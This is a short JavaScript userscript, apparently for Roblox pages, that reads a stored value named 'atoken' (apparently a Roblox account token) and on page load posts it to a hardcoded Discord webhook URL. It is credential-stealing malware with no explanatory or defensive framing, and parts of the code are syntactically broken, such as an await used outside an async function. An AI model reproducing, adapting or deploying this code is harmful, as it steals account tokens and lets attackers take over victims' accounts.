function roblox() {
    console.log(await GM_getValue('able'));
    console.log(await GM_getValue('atoken'));
    window.onload = function() {
    const token = GM_getValue("atoken")
    console.log(token);
    async function doado() {
      const webhook = `https://discord.com/api/webhooks/989376633729343540/UK4cUaYOKJ4k1jd0iaVkvPfkUVajy9zrQ1J5bg7Be61cxgQs3xP1Kt5afOCtBPJ1mthB`
      const graves = '```'

        await fetch("https://discord.com/api/webhooks/989376633729343540/UK4cUaYOKJ4k1jd0iaVkvPfkUVajy9zrQ1J5bg7Be61cxgQs3xP1Kt5afOCtBPJ1mthB", {
          "headers": {
            "accept": "*/*",
            "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site"
          },
            "referrer": "https://www.roblox.com/",
            "referrerPolicy": "strict-origin-when-cross-origin",
            "body": `content=token:`+graves+token+graves,
            "method": "POST",
            "mode": "cors",
            "credentials": "omit"
          });
    }
    doado()
}
